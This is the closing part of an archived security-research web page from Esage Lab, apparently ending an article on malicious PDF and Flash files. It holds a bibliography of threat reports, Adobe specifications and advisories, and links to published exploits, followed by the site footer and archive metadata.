<p>1. Kaspersky Lab <a href="https://web.archive.org/web/20180406044450/http://www.securelist.com/ru/analysis/208050606/Kaspersky_Security_Bulletin_2009_Osnovnaya_statistika_za_2009_god#1">Kaspersky Security Bulletin 2009. Основная статистика за 2009 год.</a> <br>2. ScanSafe. <a href="https://web.archive.org/web/20180406044450/http://www.computerworld.com/s/article/9157438/Rogue_PDFs_account_for_80_of_all_exploits_says_researcher?source=rss_news">Annual Global Threat Report 2009.</a> <br>3. Kaspersky Lab <a href="https://web.archive.org/web/20180406044450/http://www.securelist.com/ru/analysis/208050602/Reyting_vredonosnykh_programm_dekabr_2009"> Malicious software rating, декабрь 2009.</a> <br>4. Kaspersky Lab <a href="https://web.archive.org/web/20180406044450/http://www.securelist.com/ru/analysis/208050611/Reyting_vredonosnykh_programm_yanvar_2010"> Malicious software rating, январь 2010.</a> <br>5. D. Stevens. <a href="https://web.archive.org/web/20180406044450/http://hakin9.org/system/articles/attachment1s/7862/original/pdf_article.pdf?1249336858">Anatomy of Malicious PDF Documents</a> <br>6. Adobe. <a href="https://web.archive.org/web/20180406044450/http://www.adobe.com/devnet/acrobat/pdfs/PDF32000_2008.pdf">Portable Document Format - Part 1: PDF 1.7, First Edition</a> <br>7. Milw0rm. <a href="https://web.archive.org/web/20180406044450/http://www.milw0rm.com/exploits/8569">Эксплойт для CVE 2009-1492 </a> <br>8. Bojan Zdrnja. <a href="https://web.archive.org/web/20180406044450/http://isc.sans.org/diary.html?storyid=1519">Browser *does* matter, not only for vulnerabilities - a story on JavaScript deobfuscation.</a> <br>9. SecurityFocus. <a href="https://web.archive.org/web/20180406044450/http://downloads.securityfocus.com/vulnerabilities/exploits/27641-collectEmailInfo-PoC.txt">Exploit for CVE-5659 </a> <br>10. Adobe. <a href="https://web.archive.org/web/20180406044450/http://www.adobe.com/devnet/swf/pdf/swf_file_format_spec_v10.pdf">SWF File Format Specification Version 10</a> <br>11. <a href="https://web.archive.org/web/20180406044450/http://blocklistpro.com/latest/tiger-woods-seo-poisoning-attack.html">Tiger Woods SEO poisoning attack</a> <br>12. Kaspersky Lab <a href="https://web.archive.org/web/20180406044450/http://www.securelist.com/ru/weblog/39128/SWF_ili_PDF_Vse_odno_Adobe">SWF или PDF? Все одно - Adobe!</a> <br>13. Adobe. <a href="https://web.archive.org/web/20180406044450/http://www.adobe.com/devnet/acrobat/pdfs/adobe_supplement_iso32000.pdf">Acrobat Supplement to the ISO 32000</a> <br>14. Jen deHaan. <a href="https://web.archive.org/web/20180406044450/http://www.adobe.com/de/devnet/flash/articles/flash9_as3_preview_print.html">Exploring the Flash Professional 9 ActionScript 3.0 Preview</a> <br>15. Adobe. <a href="https://web.archive.org/web/20180406044450/http://www.adobe.com/devnet/actionscript/articles/avm2overview.pdf">ActionScript Virtual Machine 2 Overview</a> <br>16. Adobe. <a href="https://web.archive.org/web/20180406044450/http://www.adobe.com/support/security/advisories/apsa09-03.html">Security advisory for Adobe Reader, Acrobat and Flash Player</a> <br>17. Adobe. <a href="https://web.archive.org/web/20180406044450/http://www.adobe.com/support/security/bulletins/apsb09-10.html">Security updates available for Adobe Flash Player, Adobe Reader and Acrobat</a></p>
<p class="author" style="padding-left: 0px;"><br>Last updated: 17.03.2012</p>
</div>
  ﻿</div>
  <div id="footer">
    <p class="copyright">© 2009–2012 <a href="https://web.archive.org/web/20180406044450/http://www.nobunkum.ru/">NOBUNKUM</a> by <a href="https://web.archive.org/web/20180406044450/http://www.esagelab.ru/">Esage Lab</a> &nbsp;&nbsp;&nbsp;&nbsp;<a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/ru/">/на русском языке</a> <a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/about">/about</a> <a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/rss">/rss</a></p>
  </div>
  <script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-3546318-9']);
  _gaq.push(['_trackPageview']);
  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://web.archive.org/web/20180406044450/https://ssl' : 'https://web.archive.org/web/20180406044450/http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>


</body></html>
<!--
     FILE ARCHIVED ON 04:44:50 Apr 06, 2018 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 12:18:37 May 30, 2024.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
-->
<!--
playback timings (ms):
  captures_list: 0.647
  exclusion.robots: 0.19
  exclusion.robots.policy: 0.178
  esindex: 0.01
  cdx.remote: 9.424
  LoadShardBlock: 101.609 (3)
  PetaboxLoader3.datanode: 141.674 (4)
  load_resource: 146.615
  PetaboxLoader3.resolve: 80.058
-->